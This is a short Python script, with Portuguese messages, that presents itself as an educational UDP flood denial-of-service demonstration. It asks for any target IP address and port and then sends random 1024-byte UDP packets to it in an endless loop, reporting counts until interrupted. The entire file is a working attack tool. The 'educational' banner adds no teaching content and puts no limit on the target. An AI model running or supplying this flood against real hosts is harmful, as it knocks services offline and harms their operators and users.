import socket
import random
import time

print("="*40)
print("Demonstração de DoS (UDP Flood) - Educacional")
print("="*40)

ip = input("IP Alvo (ex: 127.0.0.1): ")
porta = int(input("Porta Alvo (ex: 8000): "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
pacote_lixo = random._urandom(1024) 

print(f"\n[+] Iniciando disparo de pacotes UDP para {ip}:{porta}...")
print("[!] Pressione CTRL+C para parar.\n")

time.sleep(2)
pacotes_enviados = 0

try:
    while True:
        sock.sendto(pacote_lixo, (ip, porta))
        pacotes_enviados += 1
        
        if pacotes_enviados % 5000 == 0:
            print(f"[{pacotes_enviados}] pacotes enviados...")
            
except KeyboardInterrupt:
    print(f"\n[-] Ataque interrompido. Total de pacotes: {pacotes_enviados}")